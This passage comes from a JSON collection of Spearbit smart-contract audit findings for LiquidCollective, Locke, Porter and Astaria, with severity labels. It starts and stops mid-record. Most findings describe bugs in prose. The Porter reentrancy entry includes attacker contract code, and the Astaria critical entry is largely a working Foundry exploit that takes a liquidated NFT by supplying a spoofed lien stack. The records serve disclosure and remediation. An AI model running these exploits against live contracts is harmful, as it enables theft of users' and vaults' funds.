        "body": "The event log will be different between the old and new implementations. In the old implementation, the latest RequestedValidatorExits event in the logs will always contain the most up-to-date count of requested exits (count) of an operator after a \"catch-up\" attempt. This is because a new RequestedValidatorExits event with the up-to-date currentStoppedCount is emitted at the end of the async requestValidatorExits function call. However, in the new implementation, the latest RequestedValidatorExits event in the logs contains the outdated or previous count of an operator after a \"catch-up\" attempt since a new RequestedValidatorExits event is not emitted at the end of the Oracle reporting transaction. If any off-chain component depends on the latest RequestedValidatorExits event in the logs to determine the count of requested exits (count), it might potentially cause the off-chain component to read and process outdated information. For instance, an operator's off-chain component might be reading the count within the latest Request- edValidatorExits event in the logs and comparing it against its internal counter to decide if more validators need to be exited. The following shows the discrepancy between the events emitted between the old and new implementations. Catch-up implementation in the previous design 1) Catch-up was carried out async when someone called the requestValidatorExits > _pickNextValida- torsToExitFromActiveOperators function 2) Within the _pickNextValidatorsToExitFromActiveOperators function. Assume an operator called opera It will attempt to \"catch-up\" by and its currentRequestedExits is less than the currentStoppedCount. performing the following actions: 1) Emit UpdatedRequestedValidatorExitsUponStopped(opera, currentRequestedExits, currentStoppedCount) event. 2) Let x be the no. of validator count to \"catch-up\" (x = currentStoppedCount (cid:0) currentRequestedExits) 3) opera.picked will be incremented by x. Since opera.picked has not been initialized yet, opera.picked = x 3) Assume that the opera is neither the operator with the highest validation count nor the operator with the second highest. As such, opera is not \"picked\" to exit its validators 5 4) Near the end of the _pickNextValidatorsToExitFromActiveOperators function, it will loop through all op- erators that have operator .picked > 0 and perform some actions. The following actions will be performed against opera since opera.picked > 0: 1) Emit RequestedValidatorExits(opera, currentStoppedCount) event 2) Set opera.requestedExits = currentStoppedCount. 5) After the transaction, two events were emitted for opera to indicate a catch-up had been attempted.  UpdatedRequestedValidatorExitsUponStopped(opera, currentRequestedExits, currentStoppedCount)  RequestedValidatorExits(opera, currentStoppedCount) Catch-up implementation in the new design 1. Catch-up was carried out within the _setStoppedValidatorCounts function during Oracle reporting. 2. Let _stoppedValidatorCounts[idx] be the currentStoppedCount AND operators.requestedExits be currentRequestedExits 3. Assume an operator called opera and its currentRequestedExits is less than the currentStoppedCount. It will attempt to \"catch-up\" by performing the following actions: 1. Emit UpdatedRequestedValidatorExitsUponStopped(opera, currentRequestedExits, currentStoppedCount) event. 2. Set opera.requestedExits = currentStoppedCount. 4. After the transaction, only one event was emitted for opera to indicate a catch-up had been attempted.  UpdatedRequestedValidatorExitsUponStopped(opera, currentRequestedExits, currentStoppedCount) In addition, as per the comment below, it was understood that unsolicited exits are considered as if exit requests were performed for them. In this case, the latest RequestedValidatorExits event in the logs should reflect the most up-to-date count of exit requests for an operator including unsolicited exits at any time. File: OperatorsRegistry.1.sol 573: ,! 574: ,! were performed for them vars.currentValidatorExitsDemand); // we decrease the demand, considering unsollicited exits as if the exit requests vars.currentValidatorExitsDemand -= LibUint256.min(unsollicitedExits,",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Informational"
        ]
    },
    {
        "title": "UnaccruedSeconds do not increase even if nobody is actively staking",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "The unstreamed variable tracks whether someone is staking in the contract or not. However, because of the division precision loss at Locke.sol#L164-L166 and Locke.sol#L187, unstreamed > 0 may happen even when everyone has already withdrawn all deposited tokens from the contract, i.e. ts.token = 0 for everyone. Consider the following proof of concept with only two users, Alice and Bob:  streamDuration = 8888  At t = startTime, Alice stakes 1052 wei of deposit tokens.  At t = startTime + 99, Bob stakes 6733 wei of deposit tokens.  At t = startTime + 36, both Alice and Bob exits from the contract. At this point Alices and Bobs ts.tokens are both 0 but unstreamed = 1 wei. The abovementined numbers are the resault of a fuzzing campaign and were not carefully crafted, therefore this issue can also occur under normal circumstances. function updateStreamInternal() internal { ... uint256 tdelta = timestamp - lastUpdate; if (tdelta > 0) { if (unstreamed == 0) { unaccruedSeconds += uint32(tdelta); } else { unstreamed -= uint112(tdelta * unstreamed / (endStream - lastUpdate)); } } ... }",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Old governor can call acceptGov() after renouncing its role through _abdicate()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "The __abdicate function does not reset pendingGov value to 0. Therefore, if a pending governor is set the user can become a governor by calling acceptGov.",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: High Risk"
        ]
    },
    {
        "title": "User can lose their reward due truncated division",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "The truncated division can cause users to lose rewards in this update round which may happen when any of the following conditions are true: 1. RewardToken.decimals() is too low. 2. Reward is updated too frequently. 3. StreamDuration is too large. 4. TotalVirtualBalance is too large (e.g., stake near the end of stream). This could potentially happen especially when the 1st case is true. Consider the following scenario:  rewardToken.decimals() = 6.  depositToken.decimals() can be any (assume its 18).  rewardTokenAmount = 1K * 10**6.  streamDuration = 1209600 (two weeks).  totalVirtualBalance = streamDuration * depositTokenAmount / timeRemaining where depositToken- Amount = 100K 10**18 and timeRemaining = streamDuration (a user stakes 100K at the beginning of the stream) lastApplicableTime() - lastUpdate = 100 (about 7 block-time). Then rewards = 100 * 1000 * 10**6 * 10**18 / 1209600 / (1209600 * 100000 * 10**18 / 1209600) = 0.8267 < 1. User wants to buy the reward token at the price of 100K/1K = 100 deposit token but does not get any because of the truncated division. function rewardPerToken() public override view returns (uint256) { if (totalVirtualBalance == 0) { return cumulativeRewardPerToken; } else { // time*rewardTokensPerSecond*oneDepositToken / totalVirtualBalance uint256 rewards; unchecked { rewards = (uint256(lastApplicableTime() - lastUpdate) * rewardTokenAmount * ,! depositDecimalsOne) / streamDuration / totalVirtualBalance; } return cumulativeRewardPerToken + rewards; } }",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: High Risk"
        ]
    },
    {
        "title": "The streamAmt check may prolong a user in the stream",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "Assume that the amount of tokens staked by a user (ts.tokens) is low. This check allows another person to deposit a large stake in order to prolong the user in a stream (untilstreamAmt for the user becomes non-zero). For this duration the user would be receiving a bad rate or 0 altogether for the reward token while being unable to exit from the pool. if (streamAmt == 0) revert ZeroAmount(); Therefore, if Alice stakes a small amount of deposit token and Bob comes along and deposits a very large amount of deposit token, tts in Alices interest to exit the pool as early as possible especially when this is an indefinite stream. Otherwise the user would be receiving a bad rate for their deposit token.",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "User can stake before the stream creator produced a funding stream",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "Consider the following scenario: 1. Alice stakes in a stream before the stream starts. 2. Nobody funds the stream,. 3. In case of an indefinite stream Alice loses some of her deposit depending on when she exits the stream. For a usual stream Alice will have her deposit tokens locked until endDepositLock.",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Potential funds locked due low token decimal and long stream duration",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "In case where the deposit token decimal is too low (4 or less) or when the remaining stream duration is too long, checking streamAmt > 0 may affect regular users. They could be temporarily blocked by the contract, i.e. they cannot stake, withdraw, or get rewards, and should wait until streamAmt > 0 or the stream ends. Altough unlikely to happen it still is a potential lock of funds issue. 11 function updateStreamInternal() internal { ... if (acctTimeDelta > 0) { if (ts.tokens > 0) { uint112 streamAmt = uint112(uint256(acctTimeDelta) * ts.tokens / (endStream - ,! ts.lastUpdate)); if (streamAmt == 0) revert ZeroAmount(); ts.tokens -= streamAmt; } ... }",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Sanity check on the reward tokens decimals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "Add sanity check on the reward tokens decimals, which shouldnt exceed 33 because Token- Stream.rewards has a uint112 type. constructor( ) { uint64 _streamId, address creator, bool _isIndefinite, address _rewardToken, address _depositToken, uint32 _startTime, uint32 _streamDuration, uint32 _depositLockDuration, uint32 _rewardLockDuration, uint16 _feePercent, bool _feeEnabled LockeERC20( _depositToken, _streamId, _startTime + _streamDuration + _depositLockDuration, _startTime + _streamDuration, _isIndefinite ) MinimallyExternallyGoverned(msg.sender) // inherit factory governance // No error code or msg to reduce bytecode size require(_rewardToken != _depositToken); // set fee info feePercent = _feePercent; feeEnabled = _feeEnabled; // limit feePercent require(feePercent < 10000); // store streamParams startTime = _startTime; streamDuration = _streamDuration; // set in shared state 12 endStream = startTime + streamDuration; endDepositLock = endStream + _depositLockDuration; endRewardLock = startTime + _rewardLockDuration; // set tokens depositToken = _depositToken; rewardToken = _rewardToken; // set streamId streamId = _streamId; // set indefinite info isIndefinite = _isIndefinite; streamCreator = creator; uint256 one = ERC20(depositToken).decimals(); if (one > 33) revert BadERC20Interaction(); depositDecimalsOne = uint112(10**one); // set lastUpdate to startTime to reduce codesize and first users gas lastUpdate = startTime; }",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use a stricter bound for transferability delay",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "modifier transferabilityDelay { // ensure the time is after end stream if (block.timestamp < endStream) revert NotTransferableYet(); _; }",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Potential issue with malicious stream creator",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "Assume that users staked tokens at the beginning. The malicious stream creator could come and stake an extremely large amount of tokens thus driving up the value of totalVirtualBalance. This means that users will barely receive rewards while giving away deposit tokens at the same rate. Users can exit the pool in this case to save their unstreamed tokens. 13 function rewardPerToken() public override view returns (uint256) { if (totalVirtualBalance == 0) { return cumulativeRewardPerToken; } else { unchecked { rewards = (uint256(lastApplicableTime() - lastUpdate) * rewardTokenAmount * ,! depositDecimalsOne) / streamDuration / totalVirtualBalance; } return cumulativeRewardPerToken + rewards; } }",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Moving check require(feePercent < 10000) in updateFeeParams to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "feePercent comes directly from LockeFactorys feeParams.feePercent, which is configured in the updateFeeParams function and used across all Stream contracts. Moving this check into the updateFeeParams function can avoid checking in every contract and thus save gas.",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use calldata instead of memory for some function parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "Having function arguments in calldata instead of memory is more optimal in the aforementioned cases. See the following reference.",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Update cumulativeRewardPerToken only once after stream ends",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "Since cumulativeRewardPerToken does not change once it is updated after the stream ends, it has to be updated only once.",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Expression 10**one can be unchecked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "uint256 one = ERC20(depositToken).decimals(); if (one > 33) revert BadERC20Interaction(); depositDecimalsOne = uint112(10**one)",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Calculation of amt can be unchecked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "The value newBal in this context is always greater than prevBal because of the check located at Locke.sol#534. Therefore, we can use unchecked subtraction.",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Change lastApplicableTime() to endStream",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "Since block.timestamp >= endStream in the abovementioned cases the lastApplicableTime function will always return endStream.",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Simplifying code logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "if (timestamp < lastUpdate) { return tokens; } uint32 acctTimeDelta = timestamp - lastUpdate; if (acctTimeDelta > 0) { uint256 streamAmt = uint256(acctTimeDelta) * tokens / (endStream - lastUpdate); return tokens - uint112(streamAmt); } else { return tokens; } 17 function currDepositTokensNotYetStreamed(IStream stream, address who) external view returns (uint256) { unchecked { uint32 timestamp = uint32(block.timestamp); (uint32 startTime, uint32 endStream, ,) = stream.streamParams(); if (block.timestamp >= endStream) return 0; ( uint256 lastCumulativeRewardPerToken, uint256 virtualBalance, uint112 rewards, uint112 tokens, uint32 lastUpdate, bool merkleAccess ) = stream.tokenStreamForAccount(address(who)); if (timestamp < lastUpdate) { return tokens; } uint32 acctTimeDelta = timestamp - lastUpdate; if (acctTimeDelta > 0) { uint256 streamAmt = uint256(acctTimeDelta) * tokens / (endStream - lastUpdate); return tokens - uint112(streamAmt); } else { return tokens; } } }",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Informational"
        ]
    },
    {
        "title": "Freeze Redeems if bonds too Large",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "Issuing too many bonds can result in users being unable to redeem. This is caused by arithmetic overow in previewRedeemAtMaturity. If a users bonds andpaidAmounts (or bonds * nonPaidAmount) product is greater than 2**256, it will overow, reverting all attempts to redeem bonds.",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Reentrancy in withdrawExcessCollateral() and withdrawExcessPayment() functions.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "withdrawExcessCollateral() and withdrawExcessPayment() enable the caller to withdraw excess collateral and payment tokens respectively. Both functions are guarded by an onlyOwner modier, limiting their access to the owner of the contract. function withdrawExcessCollateral(uint256 amount, address receiver) external onlyOwner function withdrawExcessPayment(address receiver) external onlyOwner When transferring tokens, execution ow is handed over to the token contract. Therefore, if a malicious token manages to call the owners address it can also call these functions again to withdraw more tokens than required. As an example consider the following case where the collateral tokens transferFrom() function calls the owners address: 4 function transferFrom( address from, address to, uint256 amount ) public virtual override returns (bool) { if (reenter) { reenter = false; owner.attack(bond, amount); } address spender = _msgSender(); _spendAllowance(from, spender, amount); _transfer(from, to, amount); return true; } and the owner contract has a function: function attack(address _bond, uint256 _amount) external { IBond(_bond).withdrawExcessCollateral(_amount, address(this)); } When withdrawExcessCollateral() is called by owner, it allows it to withdraw double the amount via reentrancy.",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "burn() and burnFrom() allow users to lose their bonds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "The Bond contract inherits from ERC20BurnableUpgradeable. contract Bond is IBond, OwnableUpgradeable, ERC20BurnableUpgradeable, This exposes the burn() and burnFrom() functions to users who could get their bonds burned due to an error or a front-end attack.",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing two-step transfer ownership pattern",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "After a bond is created its ownership is transferred to the wallet which invoked the createBond function, but it can be later transferred to anyone at any time or the renounceOwnership function can be called. The Bond contract uses the Ownable Openzeppelin contract, which is a simple mechanism to transfer ownership without supporting a two-step ownership transfer pattern. OpenZeppelin describes Ownable as: Ownable is a simpler mechanism with a single owner \"role\" that can be assigned to a single account. This simpler mechanism can be useful for quick tests but projects with production concerns are likely to outgrow it. Ownership transfer is a critical operation and transferring it to an inaccessible wallet or renouncing ownership by mistake can effectively lock the collateral in the contract forever.",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Inefcient initialization of minimal proxy implementation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "The Bond contract uses a minimal proxy pattern when deployed by BondFactory. The proxy pattern requires a special initialize method to be called to set the state of each cloned contract. Nevertheless, the implementation contract can be left uninitialized, giving an attacker the opportunity to invoke the initialization. constructor() { tokenImplementation = address(new Bond()); _grantRole(DEFAULT_ADMIN_ROLE, _msgSender()); } After the reporting the issue it was discovered that a separate (not merged) development branch implements a deployment script which initializes the Bond implementation contract after the main deployment of BondFactory, leaving a narrow window for the attacker to leverage this issue and reducing impact signicantly. deploy_bond_factory.ts#L24 6 const implementationContract = (await ethers.getContractAt( \"Bond\", await factory.tokenImplementation() )) as Bond; try { await waitUntilMined( await implementationContract.initialize( \"Placeholder Bond\", \"BOND\", deployer, THREE_YEARS_FROM_NOW_IN_SECONDS, \"0x0000000000000000000000000000000000000000\", \"0x0000000000000000000000000000000000000001\", ethers.BigNumber.from(0), ethers.BigNumber.from(0), 0 ) ); } catch (e) { console.log(\"Is the contract already initialized?\"); console.log(e); } Due to the fact that the initially reviewed code did not have the proper initialization for the Bond implementation (as it was an unmerged branch) and because in case of a successful exploitation the impact on the system remains minimal, this nding is marked as low risk. It is not necessary to create a separate transaction and initialize the storage of the implementation contract to prevent unauthorized initialization.",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Verify amount is greater than 0 to avoid unnecessarily safeTransfer() calls",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "Balance should be checked to avoid unnecessary safeTransfer() calls with an amount of 0.",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Improve checks for token allow-list",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "The BondFactory contract has two enabled allow-lists by default, which require the teams approval for issuers and tokens to create bonds. However, the screening process was not properly dened before the assessment. In case a malicious token and issuer slip through the screening process the protocol can be used by malicious actors to perform mass scam attacks. In such scenario, tokens and issuers would be able to create bonds, sell those anywhere and later on exploit those tokens, leading to loss of user funds. /// @inheritdoc IBondFactory function createBond( string memory name, string memory symbol, uint256 maturity, address paymentToken, address collateralToken, uint256 collateralTokenAmount, uint256 convertibleTokenAmount, uint256 bonds ) external onlyIssuer returns (address clone)",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect revert message",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "error BondBeforeGracePeriodOrPaid() is used to revert when !isAfterGracePeriod() && amountPaid() > 0, which means the bonds is before the grace period and not paid for. Therefore, the error description is incorrect. if (isAfterGracePeriod() || amountUnpaid() == 0) { _; } else { revert BondBeforeGracePeriodOrPaid(); }",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Informational"
        ]
    },
    {
        "title": "Non-existent bonds naming/symbol restrictions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "The issuer can dene any name and symbol during bond creation. Naming is neither enforced nor constructed by the contract and may result in abusive or misleading names which could have a negative impact on the PR of the project. /// @inheritdoc IBondFactory function createBond( string memory name, string memory symbol, uint256 maturity, address paymentToken, address collateralToken, uint256 collateralTokenAmount, uint256 convertibleTokenAmount, uint256 bonds ) external onlyIssuer returns (address clone) A malicious user could hypothetically use arbitrary names to:  Mislead users into thinking they are buying bonds consisting of different tokens.  Use abusive names to discredit the team.  Attempt to exploit the frontend application by injecting arbitrary HTML data. The team had a discussion regarding naming conventions in the past. However, not all the abovementioned scenarios were brought up during that conversation. Therefore, this nding is reported as informational to revisit and estimate its potential impact, or add it as a test case during the web application implementation.",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Informational"
        ]
    },
    {
        "title": "Needles variable initialization for default values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "uint256 variable are initialized to a default value of zero per Solidity docs. Setting a variable to the default value is unnecessary.",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Informational"
        ]
    },
    {
        "title": "Deationary payment tokens are not handled in the pay() function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "The pay() function does not support rebasing/deflationary/inflationary payment tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Informational"
        ]
    },
    {
        "title": "The extra data (encoded stack) provided to advanced orders to Seaport are not validated properly by the CollateralToken upon callback",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The extra data (encoded stack) provided to advanced orders to Seaport are not validated properly by the CollateralToken upon callback when validateOrder(...) order is called by Seaport. When a stack/lien gets liquidated an auction is created on Seaport with the offerer and zone set as the Col- lateralToken and the order type is full restricted so that the aforementioned call back is performed at the end of fulfilment/matching orders on Seaport. An extra piece of information which needs to be provided by the fulfiller or matcher on Seaport is the extra data which is the encoded stack. The only validation that happens during the call back is the following to make sure that the 1st consideration's token matches with the decoded stack's lien's token: ERC20 paymentToken = ERC20(zoneParameters.consideration[0].token); if (address(paymentToken) != stack.lien.token) { revert InvalidPaymentToken(); } Besides that one does not check that this stack corresponds to the same collateralId with the same lien id. So a bidder on Seaport can take advantage of this and provide a spoofed extra data as follows: 1. The borrower collateralises its NFT token and takes a lien from a public vault 2. The lien expires and a liquidator calls liquidate(...) for the corresponding stack. 3. The bidder creates a private vault and deposits 1 wei worth of WETH into it. 4. The bidder collateralises a fake NFT token and takes a lien with 1 wei worth of WETH as a loan 5. The bidder provides the encoded fake stack from the step 4 as an extra data to settle the auction for the real liquidated lien from step 2 on Seaport. The net result from these steps are that  The original NFT token will be owned by the bidder.  The change in the sum of the ETH and WETH balances of the borrower, liquidator and the bidder would be the original borrowed amount from step 1. (might be off by a few wei due to division errors when calculating the liquidator fees).  The original public vault would not receive its loan amount from the borrower or the auction amount the Seaport liquidation auction. If the borrower, the liquidator and the bidder were the same, this entity would end up with its original NFT token plus the loaned amount from the original public vault. If the liquidator and the bidder were the same, the bidder would end up with the original NFT token and might have to pay around 1 wei due to division errors. The borrower gets to keep its loan. The public vault would not receive the loan or any portion of the amount settled in the liquidation auction. The following diff in the test contracts is needed for the PoC to work: 5 diff --git a/src/test/TestHelpers.t.sol b/src/test/TestHelpers.t.sol index fab5fbd..5c9bfc8 100644 --- a/src/test/TestHelpers.t.sol +++ b/src/test/TestHelpers.t.sol @@ -163,7 +163,6 @@ contract ConsiderationTester is BaseSeaportTest, AmountDeriver { vm.label(address(this), \"testContract\"); } } - contract TestHelpers is Deploy, ConsiderationTester { using CollateralLookup for address; using Strings2 for bytes; @@ -1608,7 +1607,7 @@ contract TestHelpers is Deploy, ConsiderationTester { orders, new CriteriaResolver[](0), fulfillments, address(this) incomingBidder.bidder - + ); } else { consideration.fulfillAdvancedOrder( @@ -1621,7 +1620,7 @@ contract TestHelpers is Deploy, ConsiderationTester { ), new CriteriaResolver[](0), bidderConduits[incomingBidder.bidder].conduitKey, address(this) incomingBidder.bidder - + ); } delete fulfillments; The PoC: forge t --mt testScenario9 --ffi -vvv // add the following test case to // file: src/test/LienTokenSettlementScenarioTest.t.sol // Scenario 8: commitToLien -> liquidate -> settle Seaport auction with mismtaching stack as an ,! extraData function testScenario9() public { TestNFT nft = new TestNFT(1); address tokenContract = address(nft); uint256 tokenId = uint256(0); vm.label(address(this), \"borrowerContract\"); { // create a PublicVault with a 14-day epoch address publicVault = _createPublicVault( strategistOne, strategistTwo, 14 days, 1e17 ); vm.label(publicVault, \"Public Vault\"); // lend 10 ether to the PublicVault as address(1) _lendToVault( Lender({addr: address(1), amountToLend: 10 ether}), payable(publicVault) 6 ); WETH9.balanceOf(publicVault)); emit log_named_uint(\"Public vault WETH balance before commiting to a lien\", ,! emit log_named_uint(\"borrower ETH balance before commiting to a lien\", address(this).balance); emit log_named_uint(\"borrower WETH balance before commiting to a lien\", ,! WETH9.balanceOf(address(this))); // borrow 10 eth against the dummy NFT with tokenId 0 (, ILienToken.Stack memory stack) = _commitToLien({ vault: payable(publicVault), strategist: strategistOne, strategistPK: strategistOnePK, tokenContract: tokenContract, tokenId: tokenId, lienDetails: ILienToken.Details({ maxAmount: 50 ether, rate: (uint256(1e16) * 150) / (365 days), duration: 10 days, maxPotentialDebt: 0 ether, liquidationInitialAsk: 100 ether }), amount: 10 ether }); assertEq( nft.ownerOf(tokenId), address(COLLATERAL_TOKEN), \"The bidder did not receive the collateral token after the auction end.\" ); WETH9.balanceOf(publicVault)); emit log_named_uint(\"Public vault WETH balance after commiting to a lien\", ,! emit log_named_address(\"NFT token owner\", nft.ownerOf(tokenId)); emit log_named_uint(\"borrower ETH balance after commiting to a lien\", address(this).balance); emit log_named_uint(\"borrower WETH balance after commiting to a lien\", ,! WETH9.balanceOf(address(this))); uint256 collateralId = tokenContract.computeId(tokenId); // verify the strategist has no shares minted assertEq( PublicVault(payable(publicVault)).balanceOf(strategistOne), 0, \"Strategist has incorrect share balance\" ); // verify that the borrower has the CollateralTokens assertEq( COLLATERAL_TOKEN.ownerOf(collateralId), address(this), \"CollateralToken not minted to borrower\" ); // fast forward to the end of the lien one vm.warp(block.timestamp + 10 days); address liquidatorOne = vm.addr(0x1195da7051); vm.label(liquidatorOne, \"liquidator 1\"); // liquidate the lien vm.startPrank(liquidatorOne); 7 emit log_named_uint(\"liquidator WETH balance before liquidation\", WETH9.balanceOf(liquidatorOne)); OrderParameters memory listedOrder = _liquidate(stack); vm.stopPrank(); assertEq( LIEN_TOKEN.getAuctionLiquidator(collateralId), liquidatorOne, \"liquidator is not stored in s.collateralLiquidator[collateralId]\" ); // --- start of the attack --- vm.label(bidder, \"bidder\"); vm.startPrank(bidder); TestNFT fakeNFT = new TestNFT(1); address fakeTokenContract = address(fakeNFT); uint256 fakeTokenId = uint256(0); vm.stopPrank(); address privateVault = _createPrivateVault( bidder, bidder ); vm.label(privateVault, \"Fake Private Vault\"); _lendToPrivateVault( PrivateLender({ addr: bidder, amountToLend: 1 wei, token: address(WETH9) }), payable(privateVault) ); vm.startPrank(bidder); // it is important that the fakeStack.lien.token is the same as the original stack's token // below deals 1 wei to the bidder which is also the fakeStack borrower (, ILienToken.Stack memory fakeStack) = _commitToLien({ vault: payable(privateVault), strategist: bidder, strategistPK: bidderPK, tokenContract: fakeTokenContract, tokenId: fakeTokenId, lienDetails: ILienToken.Details({ maxAmount: 1 wei, rate: 1, // needs to be non-zero duration: 1 hours, // s.minLoanDuration maxPotentialDebt: 0 ether, liquidationInitialAsk: 1 wei }), amount: 1 wei }); emit log_named_uint(\"CollateralToken WETH balance before auction end\", ,! WETH9.balanceOf(address(COLLATERAL_TOKEN))); // _bid deals 300 ether to the bidder _bid( Bidder({bidder: bidder, bidderPK: bidderPK}), listedOrder, // order paramters created for the original stack during the liquidation 100 ether, // stack.lien.details.liquidationInitialAsk 8 fakeStack ); emit log_named_uint(\"Public vault WETH balance after auction end\", WETH9.balanceOf(publicVault)); emit log_named_uint(\"borrower WETH balance after auction end\", WETH9.balanceOf(address(this))); emit log_named_uint(\"liquidator WETH balance after auction end\", WETH9.balanceOf(liquidatorOne)); emit log_named_uint(\"bidder WETH balance after auction end\", WETH9.balanceOf(bidder)); emit log_named_uint(\"bidder ETH balance before commiting to a lien\", address(bidder).balance); emit log_named_uint(\"CollateralToken WETH balance after auction end\", ,! emit log_named_address(\"bidder\", bidder); emit log_named_address(\"owner of the original collateral after auction end\", ,! WETH9.balanceOf(address(COLLATERAL_TOKEN))); nft.ownerOf(tokenId)); // _removeLien is not called for collateralId assertEq( LIEN_TOKEN.getAuctionLiquidator(collateralId), liquidatorOne, \"_removeLien is called for collateralId\" ); // WETH balance of the public vault is still 0 even after the auction assertEq( WETH9.balanceOf(publicVault), 0 ); } assertEq( nft.ownerOf(tokenId), bidder, \"The bidder did not receive the collateral token after the auction end.\" ); }",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "AstariaRouter.liquidate(...) can be called multiple times for an expired lien/stack",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
